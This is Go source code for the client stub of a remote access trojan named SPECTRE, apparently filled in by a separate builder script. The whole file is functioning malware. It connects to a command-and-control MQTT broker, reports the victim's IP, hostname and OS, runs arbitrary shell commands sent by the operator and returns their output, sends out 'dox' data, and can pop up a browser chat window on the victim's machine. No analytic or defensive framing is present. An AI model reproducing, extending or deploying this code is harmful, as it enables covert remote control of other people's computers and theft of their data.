// SPECTRE_Stub.go
// SPECTRE: System for Persistent Execution, Control, and Targeted Remote Engagement
package main

import (
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"time"

	"github.com/eclipse/paho.mqtt.golang"
)

var (
	brokerURL  = "{BROKER_URL}" // To be replaced by SPECTRE.py
	brokerPort = {BROKER_PORT}  // To be replaced by SPECTRE.py
	topic      = "{TOPIC}"      // To be replaced by SPECTRE.py
	botID      = "{BOT_ID}"     // To be replaced by SPECTRE.py
	apiToken   = "{API_TOKEN}"  // To be replaced by SPECTRE.py

	client        mqtt.Client
	running       bool = true
	isConnected   bool
	currentDir    string
	infectedDate  string
	messageChan   chan string // Channel to pass messages
	closeChan     chan bool   // Channel to signal chat closure
	replyChan     chan string // Channel to pass replies back to MQTT handler
	logFile       *os.File    // File for logging instead of stdout
	httpServer    *http.Server
	chatActive    bool        // Flag to track if a chat session is active
	chatPort      int         // Port of the active chat session
	chatMessages  []string    // Queue of messages for the chat session
	chatMutex     sync.Mutex  // Mutex to protect chatMessages
)

// HTML template for the chat interface with polling
const chatHTML = `
<!DOCTYPE html>
<html>
<head>
    <title>SPECTRE Chat</title>
    <style>
        body {
            background-color: #1a1a1a;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            margin: 20px;
        }
        #chatArea {
            width: 100%;
            height: 300px;
            background-color: #2a2a2a;
            border: 2px solid #00ff00;
            padding: 10px;
            margin-bottom: 10px;
            overflow-y: scroll;
            white-space: pre-wrap;
        }
        #messageInput {
            width: 80%;
            background-color: #2a2a2a;
            color: #00ff00;
            border: 2px solid #00ff00;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            padding: 5px;
        }
        button {
            background-color: #333333;
            color: #00ff00;
            border: 2px solid #00ff00;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            padding: 5px 10px;
            cursor: pointer;
        }
        button:hover {
            background-color: #444444;
        }
    </style>
</head>
<body>
    <div id="chatArea"></div>
    <input type="text" id="messageInput" placeholder="Enter your reply (or press Enter to skip)">
    <button onclick="sendReply()">Send</button>
    <script>
        const chatArea = document.getElementById('chatArea');
        const messageInput = document.getElementById('messageInput');
        let lastMessageCount = 0;

        // Initial message
        fetchMessages();

        // Poll for new messages every second
        setInterval(fetchMessages, 1000);

        function fetchMessages() {
            fetch('/messages')
                .then(response => response.json())
                .then(data => {
                    if (data.messages.length > lastMessageCount) {
                        chatArea.textContent = data.messages.join('\n');
                        lastMessageCount = data.messages.length;
                        chatArea.scrollTop = chatArea.scrollHeight;
                    }
                })
                .catch(err => console.error('Error fetching messages:', err));
        }

        // Handle Enter key to send reply
        messageInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                sendReply();
            }
        });

        function sendReply() {
            const reply = messageInput.value.trim();
            if (reply !== "") {
                fetch('/reply', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ reply: reply })
                }).then(response => response.json())
                  .then(data => {
                      if (data.status === 'success') {
                          messageInput.value = "";
                      }
                  }).catch(err => {
                      console.error('Error sending reply:', err);
                  });
            }
        }
    </script>
</body>
</html>
`

func init() {
	// Initialize log file
	var err error
	logFile, err = os.OpenFile("spectre.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		// If we can't open the log file, fall back to stderr
		logFile = os.Stderr
	}

	// Initialize current directory
	home, err := os.UserHomeDir()
	if err != nil {
		fmt.Fprintf(logFile, "Error getting home directory: %v\n", err)
		currentDir = "."
	} else {
		currentDir = home
	}
	infectedDate = time.Now().Format(time.RFC3339)
}

type ConnectMessage struct {
	Type     string `json:"type"`
	ID       string `json:"id"`
	IP       string `json:"ip"`
	OS       string `json:"os"`
	Hostname string `json:"hostname"`
}

type CommandMessage struct {
	Type   string `json:"type"`
	Target string `json:"target"`
	Action string `json:"action"`
	Command string `json:"command,omitempty"`
	Message string `json:"message,omitempty"`
}

type ResponseMessage struct {
	Type      string `json:"type"`
	ID        string `json:"id"`
	IP        string `json:"ip"`
	Message   string `json:"message,omitempty"`
	Result    string `json:"result,omitempty"`
	CurrentDir string `json:"current_dir,omitempty"`
	ZipData   string `json:"zip_data,omitempty"`
}

func sendPresence(client mqtt.Client) {
	hostname, _ := os.Hostname()
	ip, err := getLocalIP()
	if err != nil {
		fmt.Fprintf(logFile, "Error getting local IP: %v\n", err)
		return
	}
	osInfo := runtime.GOOS
	connectMsg := ConnectMessage{
		Type:     "connect",
		ID:       botID,
		IP:       ip,
		OS:       osInfo,
		Hostname: hostname,
	}
	msgBytes, _ := json.Marshal(connectMsg)
	client.Publish(topic, 1, false, msgBytes)
	fmt.Fprintf(logFile, "Bot %s sent presence: %s\n", botID, string(msgBytes))
}

func sendPresencePeriodically() {
	for running {
		if isConnected {
			sendPresence(client)
		}
		time.Sleep(24 * time.Hour) // Send presence every 24 hours
	}
}

func onConnect(client mqtt.Client) {
	// Clear any retained messages on the topic
	client.Publish(topic, 1, true, nil)
	fmt.Fprintf(logFile, "Bot %s cleared retained messages on topic %s\n", botID, topic)
	client.Subscribe(topic, 1, nil)
	fmt.Fprintf(logFile, "Bot %s subscribed to topic %s\n", botID, topic)
	isConnected = true

	// Send a presence message on first connect
	sendPresence(client)
}

func onDisconnect(client mqtt.Client, err error) {
	fmt.Fprintf(logFile, "Bot %s disconnected from MQTT broker: %v\n", botID, err)
	isConnected = false
}

func getLocalIP() (string, error) {
	// Get all network interfaces
	interfaces, err := net.Interfaces()
	if err != nil {
		return "", err
	}

	// Iterate through interfaces to find a routable IPv4 address
	for _, iface := range interfaces {
		// Skip down or loopback interfaces
		if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 {
			continue
		}

		addrs, err := iface.Addrs()
		if err != nil {
			continue
		}

		for _, addr := range addrs {
			// Parse the address to determine if it's IPv4 or IPv6
			var ip net.IP
			switch v := addr.(type) {
			case *net.IPNet:
				ip = v.IP
			case *net.IPAddr:
				ip = v.IP
			default:
				continue
			}

			// Prefer IPv4 addresses, skip loopback and link-local addresses
			if ip.To4() != nil && !ip.IsLoopback() && !ip.IsLinkLocalUnicast() {
				return ip.String(), nil
			}
		}
	}

	// Fallback: try resolving hostname (less reliable)
	hostname, err := os.Hostname()
	if err != nil {
		return "", err
	}
	addrs, err := net.LookupHost(hostname)
	if err != nil || len(addrs) == 0 {
		return "", err
	}

	// Prefer IPv4 addresses in the fallback
	for _, addr := range addrs {
		ip := net.ParseIP(addr)
		if ip == nil {
			continue
		}
		if ip.To4() != nil && !ip.IsLoopback() && !ip.IsLinkLocalUnicast() {
			return ip.String(), nil
		}
	}

	// Final fallback: return loopback if no routable address found
	return "127.0.0.1", nil
}

func executeShellCommand(command string) string {
	if strings.ToLower(command) == "dir" || strings.ToLower(command) == "ls" {
		dirEntries, err := os.ReadDir(currentDir)
		if err != nil {
			return fmt.Sprintf("Error listing directory: %v", err)
		}
		var entries []string
		for _, entry := range dirEntries {
			entries = append(entries, entry.Name())
		}
		return strings.Join(entries, "\n")
	} else if strings.ToLower(command[:3]) == "cd " {
		newDir := strings.TrimSpace(command[3:])
		if newDir == "" {
			return "No directory specified"
		}
		var newPath string
		if filepath.IsAbs(newDir) {
			newPath = newDir
		} else {
			newPath = filepath.Join(currentDir, newDir)
		}
		if _, err := os.Stat(newPath); os.IsNotExist(err) {
			return fmt.Sprintf("Directory not found: %s", newPath)
		}
		currentDir, _ = filepath.Abs(newPath)
		return fmt.Sprintf("Changed directory to %s", currentDir)
	} else {
		var cmd *exec.Cmd
		if runtime.GOOS == "windows" {
			cmd = exec.Command("cmd", "/C", command)
		} else if runtime.GOOS == "darwin" {
			cmd = exec.Command("sh", "-c", command)
		} else {
			cmd = exec.Command("bash", "-c", command)
		}
		cmd.Dir = currentDir
		output, err := cmd.CombinedOutput()
		if err != nil {
			return fmt.Sprintf("Error executing command: %v\nOutput: %s", err, output)
		}
		return string(output)
	}
}

func createDoxZip() string {
	ip, err := getLocalIP()
	if err != nil {
		fmt.Fprintf(logFile, "Error getting local IP: %v\n", err)
		ip = "unknown"
	}
	data := map[string]string{
		"ip":           ip,
		"id":           botID,
		"infected_date": infectedDate,
	}
	dataBytes, _ := json.Marshal(data)
	// In a real implementation, you'd create a zip file in memory
	// For simplicity, we'll just return the hex-encoded JSON
	return hex.EncodeToString(dataBytes)
}

func handleMessageInteraction(message string) {
	// If a chat session is already active, append the message to the existing session
	chatMutex.Lock()
	if chatActive {
		chatMessages = append(chatMessages, fmt.Sprintf("Received: %s", message))
		chatMutex.Unlock()
		fmt.Fprintf(logFile, "Appended message to existing chat session\n")
		return
	}

	// Start a new chat session
	chatMessages = []string{fmt.Sprintf("Received: %s", message)}
	chatActive = true
	chatPort = rand.Intn(65535-49152) + 49152 // Choose a random port between 49152 and 65535
	addr := fmt.Sprintf("localhost:%d", chatPort)
	chatMutex.Unlock()

	// Create a temporary file for the HTML
	tempFile := filepath.Join(os.TempDir(), fmt.Sprintf("spectre_chat_%s.html", botID))
	err := ioutil.WriteFile(tempFile, []byte(chatHTML), 0644)
	if err != nil {
		fmt.Fprintf(logFile, "Error writing chat HTML to temp file: %v\n", err)
		chatActive = false
		return
	}
	defer os.Remove(tempFile)

	// Set up the HTTP server
	mux := http.NewServeMux()
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		http.ServeFile(w, r, tempFile)
	})
	mux.HandleFunc("/messages", func(w http.ResponseWriter, r *http.Request) {
		chatMutex.Lock()
		defer chatMutex.Unlock()
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string][]string{"messages": chatMessages})
	})
	mux.HandleFunc("/reply", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != "POST" {
			http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
			return
		}
		var replyData struct {
			Reply string `json:"reply"`
		}
		if err := json.NewDecoder(r.Body).Decode(&replyData); err != nil {
			http.Error(w, "Invalid request", http.StatusBadRequest)
			return
		}
		chatMutex.Lock()
		chatMessages = append(chatMessages, fmt.Sprintf("Sent: %s", replyData.Reply))
		chatMutex.Unlock()
		replyChan <- replyData.Reply
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]string{"status": "success"})
	})

	httpServer = &http.Server{
		Addr:    addr,
		Handler: mux,
	}

	// Start the HTTP server in a goroutine
	go func() {
		if err := httpServer.ListenAndServe(); err != http.ErrServerClosed {
			fmt.Fprintf(logFile, "HTTP server error: %v\n", err)
		}
	}()

	// Open the browser to the chat URL
	url := fmt.Sprintf("http://%s", addr)
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "start", url)
	} else if runtime.GOOS == "darwin" {
		cmd = exec.Command("open", url)
	} else {
		cmd = exec.Command("xdg-open", url)
	}
	if err := cmd.Start(); err != nil {
		fmt.Fprintf(logFile, "Error opening browser: %v\n", err)
		chatActive = false
		return
	}
	fmt.Fprintf(logFile, "Opened browser for chat at %s\n", url)

	// Wait for the close signal to terminate the chat session
	<-closeChan
	fmt.Fprintf(logFile, "Chat session closed due to close_message command\n")

	// Stop the HTTP server and reset the chat session
	if err := httpServer.Close(); err != nil {
		fmt.Fprintf(logFile, "Error closing HTTP server: %v\n", err)
	}
	chatMutex.Lock()
	chatActive = false
	chatMessages = nil
	chatPort = 0
	httpServer = nil
	chatMutex.Unlock()
}

func onMessage(client mqtt.Client, msg mqtt.Message) {
	var data CommandMessage
	if err := json.Unmarshal(msg.Payload(), &data); err != nil {
		fmt.Fprintf(logFile, "Bot %s error decoding message: %v\n", botID, err)
		return
	}
	fmt.Fprintf(logFile, "Bot %s received message: %s\n", botID, string(msg.Payload()))

	if data.Type == "command" {
		target := data.Target
		fmt.Fprintf(logFile, "Bot %s target: %s\n", botID, target)
		if target == "all" {
			fmt.Fprintf(logFile, "Bot %s processing command for 'all'\n", botID)
			action := data.Action
			fmt.Fprintf(logFile, "Bot %s action: %s\n", botID, action)
			processAction(action, data)
		} else {
			// Find the last colon to split IP (which may contain colons in IPv6) from bot ID
			lastColonIndex := strings.LastIndex(target, ":")
			if lastColonIndex == -1 {
				fmt.Fprintf(logFile, "Bot %s invalid target format: %s\n", botID, target)
				return
			}
			targetIP := target[:lastColonIndex]
			targetID := target[lastColonIndex+1:]
			fmt.Fprintf(logFile, "Bot %s target parts: [IP: %s, ID: %s]\n", botID, targetIP, targetID)

			ip, err := getLocalIP()
			if err != nil {
				fmt.Fprintf(logFile, "Error getting local IP: %v\n", err)
				return
			}
			// Normalize IPs for comparison (e.g., ::1 and 127.0.0.1 are both localhost)
			normalizedTargetIP := targetIP
			normalizedLocalIP := ip
			if targetIP == "::1" || targetIP == "127.0.0.1" {
				normalizedTargetIP = "localhost"
			}
			if ip == "::1" || ip == "127.0.0.1" {
				normalizedLocalIP = "localhost"
			}
			fmt.Fprintf(logFile, "Bot %s comparing: ip=%s, target_ip=%s, bot_id=%s, target_id=%s\n", botID, normalizedLocalIP, normalizedTargetIP, botID, targetID)
			if normalizedTargetIP == normalizedLocalIP && targetID == botID {
				fmt.Fprintf(logFile, "Bot %s target matches\n", botID)
				action := data.Action
				fmt.Fprintf(logFile, "Bot %s action: %s\n", botID, action)
				processAction(action, data)
			} else {
				fmt.Fprintf(logFile, "Bot %s target does not match: ip mismatch (%s != %s) or id mismatch (%s != %s)\n", botID, normalizedLocalIP, normalizedTargetIP, botID, targetID)
			}
		}
	}
}

func processAction(action string, data CommandMessage) {
	ip, err := getLocalIP()
	if err != nil {
		fmt.Fprintf(logFile, "Error getting local IP: %v\n", err)
		return
	}
	switch action {
	case "ping":
		fmt.Fprintf(logFile, "Bot %s processing ping command\n", botID)
		sendPresence(client) // Send presence in response to ping
	case "shell":
		command := data.Command
		result := executeShellCommand(command)
		response := ResponseMessage{
			Type:      "shell_response",
			ID:        botID,
			IP:        ip,
			Result:    result,
			CurrentDir: currentDir,
		}
		msgBytes, _ := json.Marshal(response)
		client.Publish(topic, 1, false, msgBytes)
		fmt.Fprintf(logFile, "Bot %s sent shell response: %s\n", botID, string(msgBytes))
	case "dox":
		fmt.Fprintf(logFile, "Bot %s processing dox command\n", botID)
		zipData := createDoxZip()
		response := ResponseMessage{
			Type:    "dox_response",
			ID:      botID,
			IP:      ip,
			ZipData: zipData,
		}
		msgBytes, _ := json.Marshal(response)
		client.Publish(topic, 1, false, msgBytes)
		fmt.Fprintf(logFile, "Bot %s sent dox response\n", botID)
	case "message":
		message := data.Message
		// Handle message interaction in a new goroutine to avoid blocking
		go handleMessageInteraction(message)
	case "close_message":
		fmt.Fprintf(logFile, "Bot %s received close_message command\n", botID)
		closeChan <- true
	case "disconnect":
		fmt.Fprintf(logFile, "Bot %s received disconnect command\n", botID)
		client.Disconnect(250)
		running = false // Ensure no reconnect attempts
		logFile.Close()
		os.Exit(0)
	}
}

func main() {
	fmt.Fprintf(logFile, "Bot %s starting up, waiting for messages...\n", botID)

	// Seed the random number generator for port selection
	rand.Seed(time.Now().UnixNano())

	// Initialize channels
	messageChan = make(chan string)
	closeChan = make(chan bool)
	replyChan = make(chan string)

	// MQTT client setup
	opts := mqtt.NewClientOptions()
	opts.AddBroker(fmt.Sprintf("tcp://%s:%d", brokerURL, brokerPort))
	opts.SetClientID(fmt.Sprintf("rat_bot_%s", botID))
	opts.SetKeepAlive(120 * time.Second) // Increased keep-alive interval
	opts.SetOnConnectHandler(onConnect)
	opts.SetConnectionLostHandler(onDisconnect)
	if apiToken != "" {
		opts.SetUsername(apiToken)
	}
	client = mqtt.NewClient(opts)

	// Start the periodic presence loop
	go sendPresencePeriodically()

	// Start MQTT client connection
	for running {
		if token := client.Connect(); token.Wait() && token.Error() != nil {
			fmt.Fprintf(logFile, "Bot %s failed to connect to MQTT broker: %v\n", botID, token.Error())
			time.Sleep(5 * time.Second)
			continue
		}
		fmt.Fprintf(logFile, "Bot %s successfully connected to MQTT broker\n", botID)
		client.Subscribe(topic, 1, onMessage)
		// Wait until disconnected
		for running && isConnected {
			// Check for replies from the message interaction
			select {
			case reply := <-replyChan:
				if reply != "" {
					ip, err := getLocalIP()
					if err != nil {
						fmt.Fprintf(logFile, "Error getting local IP: %v\n", err)
						continue
					}
					response := ResponseMessage{
						Type:    "message_response",
						ID:      botID,
						IP:      ip,
						Message: reply,
					}
					msgBytes, _ := json.Marshal(response)
					client.Publish(topic, 1, false, msgBytes)
					fmt.Fprintf(logFile, "Bot %s sent message reply: %s\n", botID, string(msgBytes))
				}
			default:
				time.Sleep(100 * time.Millisecond)
			}
		}
		// Do not attempt to reconnect if running is false
		if !running {
			break
		}
		time.Sleep(5 * time.Second)
	}

	// Cleanup on exit
	if running {
		client.Disconnect(250)
	}
	logFile.Close()
}